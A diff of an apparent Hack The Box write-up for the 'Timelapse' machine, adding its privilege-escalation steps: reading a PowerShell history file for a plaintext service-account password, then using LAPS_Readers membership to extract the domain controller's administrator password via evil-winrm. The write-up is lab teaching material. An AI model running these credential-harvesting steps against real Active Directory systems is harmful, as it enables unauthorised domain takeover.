@@ -51,7 +51,7 @@ Nmap done: 1 IP address (1 host up) scanned in 97.14 seconds
                                                                 
 ```
 
-From the result nmap gave we can tell its an AD box
+From the result nmap gave we can tell its an AD box 
 
 I'll add the domain name to my /etc/hosts file
 
@@ -279,7 +279,7 @@ Enter Import Password:
 legacyy_dev_auth.crt  legacyy_dev_auth.key  legacyy_dev_auth.key1  legacyy_dev_auth.pfx*
 ```
 
-Cool with this we can get access to winrm
+Cool with this we can get access to winrm (ssl)
 
 ```
 ┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
@@ -334,9 +334,159 @@ Cool time to escalate privilege
 
 I'll upload winPEAS to the box and run it
 
+But damn theres AV on it 
+
+```
+*Evil-WinRM* PS C:\Users\legacyy\Documents> .\winPEAS.exe
+Program 'winPEAS.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
++ .\winPEAS.exe
++ ~~~~~~~~~~~~~.
+At line:1 char:1
++ .\winPEAS.exe
++ ~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+*Evil-WinRM* PS C:\Users\legacyy\Documents> 
 ```
 
+Manual enumeration it is then!!! I'll check the powershell history file to see if i get anything from it
+![image](https://user-images.githubusercontent.com/113513376/217147870-9c411131-ccc7-4139-b228-59e88e1afa58.png)
 
+```
+*Evil-WinRM* PS C:\Users\legacyy\Documents> more $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+Enter PEM pass phrase:
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+
+*Evil-WinRM* PS C:\Users\legacyy\Documents>
+```
+
+Cool we see that there's credential which belongs to user svc_deploy
+
+I'll login to winrm as svc_deploy using the credential 
+
+```
+Username: svc_deploy
+Password: E3R$Q62^12p7PLlC%KWaxuaV
+```
+
+```
+┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
+└─$ evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 
+```
+
+I'll do manual check again
+
+```
+*vil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
+User name                    svc_deploy
+Full Name                    svc_deploy
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/25/2021 11:12:37 AM
+Password expires             Never
+Password changeable          10/26/2021 11:12:37 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   10/25/2021 11:25:53 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *LAPS_Readers         *Domain Users
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 
+```
+
+The user `svc_deploy` is among the `LAPS_Readers` group. This group can read the local administrator password
+
+To read the LAPS password, I just need to use `Get-ADComputer` and specifically request the `ms-mcs-admpwd`property:
+
+```
+Command: Get-ADComputer DC01 -property 'ms-mcs-admpwd'
+```
+
+```
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -property 'ms-mcs-admpwd'
+
+
+DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+DNSHostName       : dc01.timelapse.htb
+Enabled           : True
+ms-mcs-admpwd     : @2Fq%pB0wsf4$%TY6p1j&4,5
+Name              : DC01
+ObjectClass       : computer
+ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
+SamAccountName    : DC01$
+SID               : S-1-5-21-671920749-559770252-3318990721-1000
+UserPrincipalName :
+```
+
+So the admin password is `@2Fq%pB0wsf4$%TY6p1j&4,5` i'll login as admin using the password
+
+```
+┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
+└─$ evil-winrm -i timelapse.htb -u administrator -p '@2Fq%pB0wsf4$%TY6p1j&4,5' -S
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+timelapse\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+
+And we're done
+
+<br> <br>
+[Back To Home](../../index.md)
 
 
 
